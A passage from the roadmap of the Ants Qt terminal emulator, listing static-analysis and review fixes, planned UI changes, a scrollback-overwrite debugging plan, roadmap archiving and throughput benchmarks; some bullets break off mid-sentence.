  DISCOVERY.md (header `0.4.0` / commit `be261d9`), AUDIT.md
  (`HEAD=be261d9`), FIXPLAN.md ("eighth audit"), and
  project_audit_updates.md (`ants-audit v0.6.3`) are point-in-time
  snapshots presented as root-level current docs. Move to
  `docs/journal/` (and rename the AUDIT.md to avoid collision with
  the audit-report files in `docs/`). Update any internal links.

  **Theme T4 — Spec self-fixes from cold-eyes pass 2.**
  - ANTS-1116.md test plan still cites `AntsHelper::auditRun` (a v2
    handler not in v1). Drop or qualify as v2.
  - ANTS-1116.md drift-detected response uses `ok: true` with exit
    code 1 — caller-side switch on `ok` sees success while the shell
    sees failure. Either add `exit_code: 3 = drift_detected` (and
    keep `ok: true`), or shift drift into `ok: false`. Pick one and
    pin it with a new INV.
  - ANTS-1116.md INV gap: response fields `raw` and `exit_code` aren't
    constrained by any INV. Add INV-11 covering both.
  - ANTS-1117.md claims `RoadmapDialog::parseBullets` exists "already
    extracted in ANTS-1100" — it doesn't (only `extractToc` is in
    `roadmapdialog.{h,cpp}`). Re-word as "to be extracted as part of
    ANTS-1117 implementation".
  - ANTS-1117.md INV-6 cites `ClaudeTabIndicator::isActive(tab)` —
    no such method exists in `coloredtabbar.h:22`. Replace with the
    actual per-tab Claude detection accessor (look for the
    `claudetabtracker.{h,cpp}` surface) before sign-off.
  - ADR-0002 line 130 claims the older spec convention is documented;
    add the concrete pointer to `tests/features/roadmap_viewer_tabs/spec.md`.
  - ANTS-1119.md "row 8" reference is opaque; replace with a
    section anchor.

  **Theme T5 — ROADMAP section-target drift.** Sections `## 0.7.0
  (target: 2026-06)` (line 463), `## 0.7.7 (target: 2026-05)`
  (line 744), `## 0.7.12 (target: 2026-05)` (line 978), and
  `## 0.7.50 (target: 2026-05)` (line 2169) are all already-shipped
  versions per CHANGELOG.md. Either rename the bucket
  ("0.7.0 — shell integration — shipped 2026-XX-XX") or drop the
  `(target: ...)` clause. The 0.7.0/0.7.7/0.7.12/0.7.50 case is
  same-class fix.

  **Theme T6 — `Source:` backfill tail.** 44 of 117 ANTS bullets
  are missing `Source:` per docs/standards/roadmap-format.md § 3.5.3;
  L4123 ANTS-1065 lacks both `Kind:` and `Source:`. ANTS-1106 is
  the in-flight backfill bullet; ANTS-1121 closes the tail.
  Sample line numbers: 401, 437, 2148-2163, 3975, 4050-4060, 4123,
  4141-4205, 4300-4352, 4370-4423.

  **Theme T7 — Status-drift on ANTS-1054.** ROADMAP.md:2586 marks
  ANTS-1054 🚧 with "Steps (b-d) still pending." Step (b) shipped
  in 0.7.58 (commit `64e67e7`, CHANGELOG.md:32-55). Update body to
  "Steps (c) and (d) still pending" (or flip to ✅ if (b) closes
  the user report).

  **Theme T8 — Stale audit-report archive hygiene.**
  `docs/AUTOMATED_AUDIT_REPORT.md` header dates 2026-04-13 (17
  days stale) — delete in favour of the dated archives, or rename
  to `_2026-04-13` for symmetry. `docs/AUDIT_TRIAGE_2026-04-16.md`
  cites pre-0.6.30 source and is referenced by RECOMMENDED_ROUTINES
  as a *gold-standard format* — add a one-line "historical
  snapshot, not current" header so readers don't mistake the 4
  verified findings for the current state.

  **Theme T9 — Minor placeholder / tone fixes.**
  - L20 legend "🚧 In progress (branch or open PR)" — project ships
    direct-to-main; soften to "active commit work."
  - L3812 references `[ANTS-1118+]` as a placeholder, but ANTS-1118
    is now allocated; replace with `[ANTS-NNNN+]`.
  - L978 / L2169 share identical heading text "independent-review
    sweep (target: 2026-05)" — TOC ambiguity; add a date.
  - CLAUDE.md:165 narrates the 0.7.18 `background_alpha` removal —
    ages; either trim or keep with date.
  - EXPERIMENTAL.md items E1 (test harness) and E6 (sanitizer CI)
    have largely shipped per CHANGELOG; revisit / mark complete.
  - DISCOVERY.md:74 says `CONTRIBUTING.md | no` — file now exists;
    update (subsumed by Theme T3 relocation).

  **Acceptance:** all themes either applied or explicitly punted to
  a follow-on bullet with reasoning. Re-running the same 4-agent
  cold-eyes review pass returns 0 HIGH findings on the doc tree.

- ✅ [ANTS-1119] **HIGH — Extract audit logic into a GUI-free
  engine module.** Shipped 2026-04-30 (0.7.59). Pure refactor: lift the engine + triage halves
  of `auditdialog.cpp` (~5000 lines, mixed presentation +
  orchestration) into a new `src/auditengine.{h,cpp}` depending on
  `Qt6::Core` only. Unblocks ANTS-1116 v2 (`audit-run` subcommand)
  and ANTS-1117 v2 (`audit-run` IPC verb) — both currently impossible
  without dragging `Qt6::Widgets` into a non-GUI binary. Acceptance
  invariants in `docs/specs/ANTS-1119.md` include byte-identical
  finding-stream / SARIF / HTML output pre-/post-refactor and a

- 📋 [ANTS-1120] **MEDIUM — Companion-instrumentation gate.**
  Before any further companion bullet beyond ANTS-1117 v1 +
  ANTS-1116 v1 ships, run a side-by-side measurement (N≥3 replays
  per configuration) of one Claude task with the existing flow
  vs. stubs of the proposed `audit-run` / `roadmap-query` /
  `id-allocate` mechanisms. Captured token counts (input + output
  + cache_read + cache_creation per the API `usage` field) feed a
  per-bullet keep / iterate / drop / inconclusive verdict, with the
  threshold values picked by the user at measurement-review time.
  Verdict reflects back into ROADMAP.md per the four-way disposition
  rules in the spec. Bullet doesn't ship code; deliverable is a
  journal artifact + measured ROADMAP edits. Spec:

### 🔍 Audit fold-in — feature code (2026-04-30)

> Aggregated findings from a scoped `/audit` run (cppcheck + clazy +
> semgrep + gitleaks) over the ANTS-1116 / 1117 / 1119 / 1120 / 1100
> implementation surface. semgrep and gitleaks both clean (0 raw).

> tripping on `class`/`namespace`/`std::function` C++ keywords) and
> several pre-existing `constVariablePointer` style hits in
> `mainwindow.cpp` outside the new code — out of scope for this
> fold-in.

- ✅ [ANTS-1122] **Audit fold-in fixes — feature-code triage.**
  Three small actionable findings inside the new code:
  - **clazy `range-loop-detach` at `src/antshelper.cpp:92`** —
    `for (const QString &line : stdoutText.split('\n', ...))`
    risks detaching the temporary `QStringList` returned by `split`.
    Fix: bind the split result to a local `const QStringList`
    first, then iterate. Same pattern any Qt-aware audit will flag
    on every refactor that ignores it.
  - **cppcheck `constVariablePointer` at `src/auditengine.cpp:153`** —
    `QStringList *fileLines` is reassigned but never written through;
    can be `const QStringList *fileLines` (or pulled out as a
    reference). Stylistic but correct.
  - **cppcheck `returnByReference` at `src/mainwindow.h:123`** —
    `MainWindow::roadmapPathForRemote()` returns `m_roadmapPath` by
    value where `const QString &` would avoid the copy. Member
    lifetime extends past the call so the reference is safe.
  **Round-2 fold-in (after the round-1 fixes landed):**
  - **clazy `range-loop-detach` at `src/roadmapdialog.cpp:363`** —
    same Qt-detach pattern as the antshelper fix; the
    `lanesRaw.split(',', ...)` inside `parseBullets` (the new ANTS-1117
    helper) needs the bind-then-iterate idiom too. Fixed in the
    same audit cycle.
  - **cppcheck `knownConditionTrueFalse` at
    `src/antshelpermain.cpp:117`** — false positive: `parseRequest`
    *does* set `*errMsg` on a `QJsonParseError`; cppcheck misses the
    pointer write because the helper lives in an anonymous namespace
    and its cross-TU heuristic is brittle. Recorded as a known FP;
    no code change.
  Locked by re-running `/audit` against the same scope after the
  fixes land — must return zero actionable findings on the next
  pass. **All four fixes shipped as part of the ANTS-1119 / 1117
  cycle** — `src/antshelper.cpp:98` binds split() to a `const
  QStringList lines` before iterating; `src/auditengine.cpp:170`
  declares the cache pointer `const QStringList *fileLines` (the
  write into the cache slot goes via a separate reference);
  `src/mainwindow.h:124` returns `const QString &` from
  `roadmapPathForRemote()`; `src/roadmapdialog.cpp:365` binds the
  `lanesRaw.split(',', …)` result to a local before iterating. All
  four sites carry an `ANTS-1122 audit-fold-in` source comment so
  the fix isn't reverted on the next pass through that code.
  Kind: review-fix. Source: audit-2026-04-30.

### 🔍 Indie-review fold-in — feature code (2026-04-30)

> Aggregated findings from a 4-agent independent review of the
> ANTS-1116 / 1117 / 1119 / 1120 / 1100 implementation surface.

> RoadmapDialog redesign). Each agent briefed only on source +
> contract docs + external specs; no test files, no author intent.
> Tiered Tier 1 / Tier 2 / Tier 3 per `/indie-review` discipline.

- ✅ [ANTS-1123] **Indie-review fold-in fixes — feature-code triage.**

  **Cross-cutting themes (caught across ≥2 lanes):**
  - **Duplicated logic that will diverge** — the AuditEngine
    extraction left `sourceForCheck` / `hardenUserRegex` /
    `isCatastrophicRegex` duplicated between engine and dialog
    files (AuditEngine lane C1/C2/C3/H1). Three CRITICALs in one
    cluster: LIMIT_MATCH value drifts (engine 200000, dialog
    100000), already-prefixed guard missing in engine, regex-shape
    detector catches different sets between the two impls.
  - **Spec ↔ code envelope drift** — AntsHelper F1 + Remote-control
    F9: spec wording prescribes JSON envelope shapes (e.g.
    `{ok:true, data:{}}`) that the code has already diverged from
    (flat `{ok:true, tabs:[]}` per the prior `ls`/`get-text`
    pattern). Reconcile at the spec layer.
  - **Self-healing on corruption missing** — AntsHelper F3
    (`QProcess::exitCode()` unspecified for `CrashExit`),
    RoadmapDialog LOW-1 (`restoreGeometry` return value ignored;
    corrupt blob persists forever).

  **Tier 1 — ship-this-week (security/contract/data-loss):**

  1. **AuditEngine C1+C2+C3+H1: unify regex helpers + sourceForCheck
     into `AuditEngine`** and call from both engine and dialog.
     Closes the regex-DoS-divergence vector permanently. The
     spec deferral was wrong.
     `src/auditengine.cpp:21-34` (engine local copies),
     `src/auditdialog.cpp:2779,2792,1817-1854` (dialog originals).
  2. **AntsHelper F2: fix INV-5 string mismatch.** Code emits
     `"could not start bash"` but spec INV-5 prescribes
     `"bash unavailable"`. One-liner at `src/antshelper.cpp:64`.
  3. **AntsHelper F1: usage errors must emit JSON envelope on
     stdout** (in addition to the stderr line). Currently
     `unknown subcommand` and `invalid JSON` paths return non-zero
     with no `{ok:false, ...}` body — Claude consumers parse
     stdout. `src/antshelpermain.cpp:117-120, 130`.

  **Tier 2 — hardening sweep:**

  4. **AntsHelper F3: signal-kill error message uses
     `proc.exitCode()` which is unspecified for `CrashExit`.**
     Drop the `%1` substitution or substitute a real signal-number
     accessor. `src/antshelper.cpp:70-75`.
  5. **AntsHelper F6: `parseRequest` treats non-object JSON as
     empty.** A request of `[]` silently runs as `{}` instead of
     a usage error. `src/antshelpermain.cpp:35-45`.
  6. **AuditEngine M1: `parseFindings` `reJustFile` regex
     over-broad.** `[^\s:]+/[^\s:]+` matches bare URLs / version
     strings (`cargo/1.75`); SARIF output gets bogus
     `physicalLocation.artifactLocation.uri`. Tighten to require a
     known extension or path-anchor. `src/auditengine.cpp:206-207`.
  7. **AuditEngine H2: promote `computeDedup` to
     `AuditEngine::computeDedup` (header-exported)** so future
     authors can't write a third copy in
     `consolidateMypyStubHints`-style sites.
  8. **Remote-control F1: INV-10 cache-invalidation contract gap.**
     Either add a 100ms wall-clock TTL OR hook
     `QFileSystemWatcher::fileChanged` to invalidate the cache OR
     revise the spec to match the implemented mtime-only behaviour.
     `src/remotecontrol.cpp:497-500`.
  9. **Remote-control F9: reconcile spec § "Error-response shape"
     with the flat-envelope convention** (`{ok:true, tabs:[]}` vs
     spec's `{ok:true, data:{}}`). The codebase precedent (`ls`,
     `get-text`) is the actual contract; spec is the outlier.
     `docs/specs/ANTS-1117.md` § Error-response shape.
  10. **RoadmapDialog LOW-1: `restoreGeometry` return-value
      ignored.** Clear the persisted blob on `restoreGeometry()
      == false` so a corrupt save doesn't masquerade as valid
      forever. `src/roadmapdialog.cpp:783`.
  11. **RoadmapDialog LOW-3: `applyPreset(Custom)` silently flips
      `m_sortOrder` to Document.** Spec INV-13 mandates this, so
      contract-correct, but produces a UX edge: clicking the
      Custom tab from History flips sort silently. Either keep
      (document the choice in a comment) or short-circuit when
      already on Custom. `src/roadmapdialog.cpp:806-808`.

  **Tier 3 — polish (refactor/style/perf):**

  - AntsHelper F4 (docstring usage-order disagreement),
    F5 (TOCTOU note — bounded by UID-scope trust),
    F7 (`readStdin` swallows open failure),
    F8 (Linux-only discipline not documented in header).
  - AuditEngine L1 (`parseFindings` matches all three regexes
    eagerly — re-order to short-circuit),
    L2 (`Finding::highConfidence` may be a zombie field per
    `audit_feature_evolution_2026-04-13` memory; verify and remove
    if unused),
    M2 (one-line comment on `applyFilter` empty-line drop intent),
    M3 (synchronous file reads in filter loop — covered by
    ANTS-1115 perf-sweep).
  - RoadmapDialog LOW-2 (tab dispatch static array brittleness vs
    `Preset` enum — add `static_assert` or drop the array),
    LOW-4 (`onCheckboxToggled` over-defensive `m_suppressCheckboxSignal`
    guard — Qt's `toggled` doesn't fire on no-change `setChecked`;
    document the retention),
    LOW-5 (constructor ~200 lines — split into `setupHeader`/
    `setupBody`/`setupSignals`/`restoreGeometryIfAny`),
    LOW-6 (`m_searchDebounce` + `m_debounce` could share one timer).

  Locked by re-running `/audit` and `/indie-review` after the
  Tier 1 fixes land — must return zero CRITICAL / HIGH on the
  next pass over the same scope. Kind: review-fix.

  17-7 fold-in note), LOW-1 (clear corrupt geometry blob on
  restoreGeometry false), LOW-3 (applyPreset(Custom)

### 🎨 UX — relocate the update-available indicator (user request 2026-04-30)

- 📋 [ANTS-1124] **Move the "update available" link from the
  right of the status bar to the menu bar, immediately to the
  right of the Help menu.** User-visible signalling lives in the
  status bar today: `m_updateAvailableLabel` (QLabel,
  `mainwindow.cpp:3832-3845`) is added via
  `statusBar()->addPermanentWidget(...)` and shows a clickable
  "Update available" link when the version-check probe finds a
  newer release on GitHub. The indicator competes with the
  Roadmap / Claude / git status widgets for the user's eye on
  the right edge of the status bar; promoting it to the menu
  bar (right of `&Help`) makes it the visually-loudest action
  in the chrome — appropriate for a one-shot "you have a new
  version" call-to-action — and frees the status-bar real
  estate for steady-state telemetry only.

  **Acceptance:**
  1. When `m_updateAvailableLabel`'s show() is called, a new
     menu-bar **action** (not a label / widget) appears to the
     right of the existing Help menu, with text matching
     today's "Update available" link copy. Clicking it routes
     to the same `updateAvailableLabel` `linkActivated`
     handler — same dialog, same Update / Skip / Postpone
     flow at `mainwindow.cpp:5505-5540`.
  2. When `hide()` is called (no update detected, or one
     successfully installed), the menu-bar action is removed.
     The state-machine driver doesn't change; only the surface.
  3. The status-bar `m_updateAvailableLabel` is removed
     entirely — no dual-surfacing.
  4. Menu-bar placement uses `QMenuBar::setCornerWidget` (right
     corner) or a top-level `QAction` added after the Help
     menu; whichever survives Qt 6.6+ on KDE/GNOME/Wayland with
     RTL layout — feature-test in `tests/features/` first.
  5. Visually the action stands out (bold weight or colour
     hint matching the theme accent) — the call-to-action
     framing is the whole point of the move.

  **Out of scope:** the version-check probe itself (already at
  `versionCheck.cpp` / `mainwindow.cpp:1889+`); the in-place
  update flow (`mainwindow.cpp:5505-5540`); the "Check for
  Updates" Help-menu action (stays where it is — it's a
  user-initiated re-probe, different from the passive
  notification this bullet is moving).

  Spec stub: write `docs/specs/ANTS-1124.md` with the INVs
  before code per `feedback_app_build_strict_loop.md` (the
  strict spec → review → fold → fix loop). Touches
  `mainwindow.{h,cpp}` only; net diff likely ≤ 60 lines + the
  feature-conformance test.

### 🐛 Scrollback overwrite during streaming (user request 2026-04-30)

- 📋 [ANTS-1118] **HIGH — Scrolling up during a Claude Code stream
  is being overwritten from the line the user is parked on.** User
  report 2026-04-30: "the scrollback is still broken — when I scroll
  up to read previous information while Claude Code is still busy
  outputting data, it overwrites from the line I am at. We need a
  way to properly debug this so that we can get to the root of the
  problem. **The bug is not new — it has been an issue ever since
  the first fix for the scrollback.**" Every prior pin/anchor
  attempt (cf. 0.7.x scroll-pin work, the user-scrolled-pin guard
  in `terminalwidget.cpp`, ANTS-0996, ANTS-1006) has shipped with
  the same gap surviving — meaning the existing pin/anchor
  invariants don't cover the actual code path the streaming output
  follows. **Investigation must precede the fix** per
  `feedback_no_workarounds.md`. The "first fix" framing matters:
  a successful fix is one where step 5's INVs cover *every* code
  path that mutates the visible viewport, not just the one repro
  the previous attempt focused on.

  **Step 1 — Reproduce reliably.** Capture a recording (e.g.
  `script -c 'claude code <something heavy>' /tmp/repro.typescript`)
  that consistently reproduces the overwrite. Replay via
  `cat /tmp/repro.typescript > $TTY` or piping through Ants
  while interactively scrolling. Acceptance: a 3-line
  reproducer shell snippet that breaks the scrollback every
  time on a clean tab.

  **Step 2 — Instrument the suspect surfaces.** Add an opt-in
  debug channel (gate via `DebugLog::Category::Scrollback` or a
  new env-var `ANTS_DEBUG_SCROLLBACK=1`) that logs, *per
  PTY-data-arrival batch*:
  - The active scrollbar `value()` and `maximum()` before
    apply.
  - Whether `m_userScrolledPin` (or whatever the current pin
    flag is named) is set, and the line number it points at.
  - Whether the rebuild path took the "preserve scroll" branch
    or the "auto-follow" branch.
  - Which of `TerminalGrid::appendCell`, `appendLine`,
    `scrollViewport`, `eraseInDisplay`, etc. fired during the
    batch.
  - The post-apply scrollbar `value()` and any clamp
    adjustments.
  Output goes to `~/.config/ants-terminal/debug.log` with
  rotating size cap (1 MB). Acceptance: a 30-second repro
  produces ≤ 200 KB of log and the responsible decision branch
  is visible in plain text.

  **Step 3 — Identify the root cause.** Likely candidates,
  ranked by probability:
  - (a) `m_userScrolledPin` resets on a code path the prior
    fixes didn't cover (e.g. CSI 7-bit cursor restore, OSC 133
    prompt-end, alt-screen toggle, DECSET 1049 enter/leave).
  - (b) A new per-paint `verticalScrollBar()->setValue(...)`
    site introduced after the pin (e.g. a 0.7.4x feature)
    races with the pin's intended value and wins because it
    fires later in the slot dispatch order.
  - (c) `TerminalGrid` mutates the visible rows in-place
    (overwriting the row the user is parked on) instead of
    appending to scrollback when the grid is full + alt-screen
    is *not* active.
  - (d) `TerminalGrid::resize` semantics: a fast PTY write
    that grows the grid past the tab's height triggers an
    implicit scroll that the pin doesn't observe.
  - (e) Newline-handling inside `vtparser`: `LF` after a wrapped
    line emits a scroll-up that mutates the user's parked
    line because `m_topLine` advances but the
    `TerminalWidget` viewport offset isn't compensated.
  Each candidate needs a targeted log signature in step 2 so
  the actual cause falls out of one repro run. Document the
  finding in a new `docs/journal/ANTS-1118-investigation.md`.

  **Step 4 — Fix at the root.** No workarounds. The fix MUST
  be a code change in the responsible component (TerminalGrid,
  TerminalWidget, vtparser, or whichever step-3 diagnosis
  fingers) — not a "snap to bottom on every PTY data" hack
  that masks the symptom. If the pin needs to track an
  additional event class, add it to the pin's contract; if
  the grid is mutating in-place wrongly, fix the rotation
  semantics.

  **Step 5 — Lock with a feature-conformance test.**
  `tests/features/scrollback_pin_during_stream/` with INVs:
  - INV-1: replaying a 50 KB PTY write while the viewport is
    pinned at row K leaves row K visible at the same y-pixel
    when the write finishes (no scroll-by-output).
  - INV-2: the pin survives DECSET 1049 enter/leave embedded
    in the stream.
  - INV-3: the pin survives an OSC 133 prompt-end embedded in
    the stream.
  - INV-4: the pin clears (auto-follow resumes) when the user
    actively scrolls back to bottom (or presses End).
  - INV-5: when the tab is *not* pinned (i.e. user is at
    bottom), new output extends scrollback in place (current
    behaviour).
  - INV-6: when alt-screen is active (vim/htop), the pin is
    a no-op (alt-screen has no scrollback by definition).

  **Out of scope for this bullet:**
  - Reflow / resize behaviour during the pinned state — that's
    its own class of issues and stays in soft-wrap-reflow's
    contract.
  - Mouse-wheel acceleration tuning (separate UX concern).
  - Search-pinned scrolling (search dialog already has its own
    anchor).

### 🎨 Status-bar polish (user request 2026-04-30)

- 📋 [ANTS-1109] **Restyle the git-branch chip to match the
  repo-visibility pill.** User screenshot 2026-04-30:
  `main` branch label sits as plain text next to the framed
  green `Public` pill, looking inconsistent now that the
  visibility pill ships. Match the chip styles: same border
  radius, same padding, same font size; colour cue derived
  from the branch — e.g. green outline for `main` /
  `master` / `trunk`, amber outline for any other branch
  (visual hint that the user is on a feature branch).
  Implementation lives in `mainwindow.cpp` status-bar widget
  setup (search `m_branchLabel` / git-branch chip); style via
  `setStyleSheet` mirroring the visibility-pill rule. Locked
  by source-grep invariants in
  `tests/features/status_bar_branch_chip/`:
  - INV-1: branch label uses the same `border: 1px solid` /
    `border-radius` / `padding` shape as the visibility pill
    (compare style-sheet substrings).
  - INV-2: green for `main` / `master` / `trunk`; amber
    otherwise.
  - INV-3: branch chip and visibility pill have equal
    `sizeHint().height()` so they bottom-align.
  Kind: doc-fix style-only / refactor (visual polish, no
  behaviour change). Source: user-2026-04-30. Lanes: MainWindow,

### 📚 Roadmap split — per-version archive (user request 2026-04-30)

> ROADMAP.md crossed 260 KiB and is becoming unwieldy in tooling
> that loads it whole — the Read-tool 256 KiB cap, the
> roadmap-query IPC cache, and `RoadmapDialog::rebuild` itself.
> User-approved approach: split by minor version. Keep the small
> "open work" surface in the project root's `ROADMAP.md`, and
> rotate closed-minor sections into per-minor archive files at
> `<project-root>/docs/roadmap/<MAJOR>.<MINOR>.md`. The viewer
> pulls archives in only on demand (History preset OR non-empty
> search), so the default render stays cheap. Spec at
> `tests/features/roadmap_viewer_archive/spec.md` (cold-eyes
> reviewed 2026-04-30 — fold-in items captured below).

- ✅ [ANTS-1125] **Roadmap split — archive feature.** Shipped
  2026-04-30. Three-pass cold-eyes review on the spec produced
  18 invariants spanning `archiveDirFor` / `loadMarkdown` /
  `shouldLoadHistory` (instance wrappers in
  `src/roadmapdialog.{h,cpp}`), the watcher hookup, the
  IPC-scope guard-rail, and the `/bump` rotation contract
  (`packaging/rotate-roadmap.sh` + `.claude/bump.json` todo +
  `docs/standards/roadmap-format.md` § 3.9 amendment). Static
  helpers driveable without instantiating a dialog. Numeric
  descending sort by `(major, minor)` defeats the lexical-trap
  at minor 10. Per-file 8 MiB + total 64 MiB caps. Thematic-
  break + HTML-comment sentinel separators between archives.
  Initial archive files at `docs/roadmap/0.5.md` and
  `docs/roadmap/0.6.md` (the only closed minors as of 0.7.x);
  0.7 stays in the live ROADMAP.md until 0.8.0 cuts. All 120
  tests pass, including 18 new INVs in
  `tests/features/roadmap_viewer_archive/`.

- ✅ [ANTS-1126] **Spec cold-eyes fold-in — archive feature.**
  Closed 2026-04-30 across three review passes:
  - **Pass 1** (initial): 4 CRITICAL + 8 HIGH + 5 MEDIUM + 5 LOW
    on the first draft — naming-rule contradiction, ordering
    ambiguity, watcher routing, enum-vs-index brittleness, plus
    failure-mode gaps and filter / sort / cap holes.
  - **Pass 2** (after fold-in): zero CRITICAL, three new HIGH
    (standard-amendment landed in same commit, `/bump` recipe
    contract pinned, sentinel-string consistency), four MEDIUM,
    five LOW.
  - **Pass 3** (after second fold-in): PASS — zero CRITICAL,
    zero new HIGH; three LOW editorial polish folded inline.
  - **INV-14 cluster review**: zero CRITICAL, three HIGH (regex
    dot-escape, EOF-case INV, idempotence content guarantee),
    four MEDIUM, four LOW. All folded — script regex-escapes
    the closed-minor `.`, no-clobber refuses to overwrite an
    existing archive, atomic write applies to both the rewritten
    ROADMAP.md and the new archive file.
  Spec at `tests/features/roadmap_viewer_archive/spec.md`;
  18 INVs across 13 main + 5 sub-INVs locked.

  **CRITICAL:**
  1. INV-1 / INV-11 naming-rule contradiction — pin the archive
     dir as "directory containing the canonical
     `m_roadmapPath`" (file-relative, not project-root-derived).
  2. INV-4 / INV-5 ordering ambiguity — state whether the 8 MiB
     truncation happens before or after concatenation, and
     whether a sentinel separator guards against a truncated
     trailing bullet bleeding into the next file's heading.
  3. INV-8 watcher routing gap — pin the archive-dir
     `directoryChanged` signal to the existing 200 ms
     `scheduleRebuild` debounce, not to direct `rebuild()`,
     so two `/bump`-time writes don't break scroll preservation.
  4. INV-6 enum vs index brittleness — assert against
     `Preset::History` enumerator, not the literal tab-index
     `1`. Future tab reorder must not silently break the
     trigger.

  **HIGH:**
  5. INV-1 failure-mode gaps — pin behaviour for `docs/roadmap/`
     being a regular file, broken symlink, symlink cycle,
     unreadable, or `docs/` itself being a symlink. Helper
     returns empty on `!S_ISDIR` and on any `opendir` failure;
     symlink-safe via canonical-path resolution.
  6. INV-3 empty-dir gap — extend (or add INV-3b) so an
     archive dir with zero `*.md` entries equals the
     missing-dir case.
  7. INV-4 filename-filter undefined — add INV-4a:
     `^[0-9]+\.[0-9]+\.md$` case-sensitive; `0.7.0.md`,
     `latest.md`, hidden files, `.bak`, non-`.md` skipped
     silently.
  8. INV-4 sort tie-breaker for `0.10.md` vs `0.9.md` — lexical
     descending puts `0.10` before `0.9` (wrong). Decide:
     zero-pad (`0.09.md`), numeric sort, or accept the bug
     with a separate roadmap item to fix at minor 10.
  9. INV-5 missing total cap — 8 MiB × N archives → potential
     OOM. Add INV-5a: total assembled-buffer cap (e.g. 64 MiB)
     OR archive-count cap (e.g. 50).
  10. INV-8 incomplete watcher contract — `directoryChanged`
      must fire on add, remove, AND rename (e.g. `git checkout`
      across branches with different archives) — pin all three.
  11. INV-9 search-parser coupling — strengthen to "INV-9 reuses
      `roadmap_viewer_tabs` INV-11 search behaviour against
      archive-augmented input". Single `id:NNNN` parser, two
      input shapes.
  12. INV-12 IPC-scope leakage — either move to the IPC contract
      spec OR rewrite as a guard-rail "no new code path reads
      from `historyArchiveDir()` outside `loadRoadmapMarkdown`."

  **MEDIUM:**
  13. `/bump` ownership unanchored — cross-reference the
      `bump.json` recipe by file path, or move "rotation =
      `/bump` responsibility" to a single sentence in
      `roadmap-format.md`.
  14. INV-13 redundant with INV-5 — fold the symlink-safety
      case ("/dev/zero" defence) into INV-5; drop INV-13
      standalone.
  15. Backward-compat prose not load-bearing as INV — add
      INV-3a: missing-dir → no extra watcher path registered.
  16. Hidden coupling on `roadmap-format.md § archive rotation`
      that doesn't exist yet — list the format-spec amendment
      as an explicit deliverable in this spec.
  17. Read-cap rationale ("~10× headroom") is operational
      reasoning, not contract — drop the commentary, keep the
      cap value.

  **LOW:**
  18. Title `(ANTS-1125)` consistency — match peer specs.
  19. INV-6 parenthetical promote/demote — promote to sub-INV
      or remove parenthetical entirely.
  20. Watcher rationale "cost of N watches" — defensive prose
      → ADR, not spec; trim.
  21. How-to-verify-pre-fix `git checkout HEAD~1` placeholder —
      align with peer-spec pattern.
  22. Out-of-scope IPC bullet duplicates INV-12 — drop one.

  Locked by re-running cold-eyes review after fold-in. Must
  return zero CRITICAL on the next pass before ANTS-1125 code
  is signed off (the code that's already drafted gets
  re-evaluated against the corrected spec, not the other way
  round).

### 🎨 Theme palette propagation gaps (user request 2026-04-30)

  Closed by ANTS-1128 below.
  Kind: fix. Source: user-2026-04-30.

- ✅ [ANTS-1128] **Theme stylesheet not reaching top-level
  dialogs.** Shipped 2026-04-30. Two user reports (dropdown
  bg + Review Changes dialog screenshot) traced to one root
  cause: `MainWindow::applyTheme` was calling
  `setStyleSheet(ss)` on the `MainWindow` instance, but Qt's
  stylesheet engine only propagates through a widget's
  **render subtree** — top-level `QDialog`s have their own
  paint chain and DO NOT inherit a parent QWidget's
  stylesheet, even when they're QObject children. The
  comment at the call site ("Qt already propagates via the
  object tree") was the misconception. Fix: switched to
  `qApp->setStyleSheet(ss)`, which fans out to every widget
  in the application including not-yet-constructed dialogs.
  All 9 dialog classes (`aidialog`, `claudetranscript`,
  `claudeallowlist`, `sshdialog`, `claudebgtasksdialog`,
  `claudeprojects`, `auditdialog`, `settingsdialog`,
  `roadmapdialog`) plus 7 ad-hoc `new QDialog(this)`
  instances (about, paste preview, snippet editor, Review
  Changes, settings-restore, etc.) now pick up the active
  theme's `QDialog`/`QMenu`/etc. selectors. Targeted child-
  widget `setStyleSheet` calls (e.g. label colours, button
  pill styles in settings/audit dialogs) are unaffected —
  they layer on top of the qApp-level stylesheet, not
  replace it. 121 tests pass.

  drop down menu while moving the mouse cursor over its menubar
  item is gone. The drop down list is fully stable." The fix
  came from 0.7.5's `NoAnimStyle` (killed Fusion's 60 Hz
  `QPropertyAnimation` cycle) plus the 0.7.5+1 follow-up
  (`04f3409`, extended intra-action suppression to
  `HoverMove`/`HoverEnter`/`HoverLeave`). The 2026-04-20
  hypothesis that KWin's compositor sync handshake was the
  amplifier proved wrong on this hardware/Plasma combo — the
  Qt-side suppressions were sufficient. Closed without further
  KWin-side experimentation. Kind: fix. Source: regression.

### ⚡ Performance

- 🚧 [ANTS-1059] **Terminal throughput slowdowns** (user report 2026-04-20).
  Intermittent stalls observed during normal use. Investigation items:
  (a) profile `onVtBatch()` under heavy-output workloads — `yes`,
  `dd`, `find /`, build logs — and identify hotspots;
  (b) audit `TerminalGrid::processAction` for O(n) allocations on
  each Print (the hot path);
  (c) check whether the async batch drain ack (`drainAck`) under
  back-pressure is creating producer-consumer sawtooth rather than
  steady flow; (d) measure paint time at 2000+ line scrollback with
  ligatures on vs off; (e) check the focus-redirect lambda and other
  `QApplication::focusChanged` handlers for expensive work per event.
  - ✅ **Benchmark harness.** `tests/perf/bench_vt_throughput.cpp`
    drives four fixed corpora — `ascii_print`, `newline_stream`,
    `ansi_sgr`, `utf8_cjk` — through `VtParser` →
    `TerminalGrid::processAction` at release-level `-O2`, no GUI.
    Emits a CSV line per corpus with bytes, actions, wall-ms,
    MB/s, actions/s. Registered under `ctest` label `perf`
    (excluded from the default `fast` suite). Run with
    `ctest -L perf --verbose` or directly; `ANTS_PERF_MB=64
    ./bench_vt_throughput` for a heavier sweep. **Baseline
    2026-04-20 on the dev laptop (4 MB per corpus):**

    | Corpus | MB/s | Actions/s | Note |
    |--------|-----:|----------:|------|
    | `ascii_print` | 23.3 | 24.4 M | Print-only; UTF-8 fast path |
    | `newline_stream` | 5.3 | 5.6 M | **4× slower — scroll/scrollback hotspot** |
    | `ansi_sgr` | 16.9 | 13.0 M | SGR dispatch |
    | `utf8_cjk` | 7.9 | 3.1 M | 3-byte UTF-8 + double-width |

    Top signal from the baseline: `newline_stream` is 4× slower
    than pure Print, pointing at `lineFeed()` →
    `TerminalGrid::scrollUp()` → scrollback deque insertion as
    the dominant cost. Matches sub-item (b) on the list above —
    next action is a `perf record`/`callgrind` run over
    `newline_stream` to confirm which `scrollUp` sub-step
    dominates (row allocation? per-line combining-char table
    copy? pushBack on the scrollback `std::deque`?).
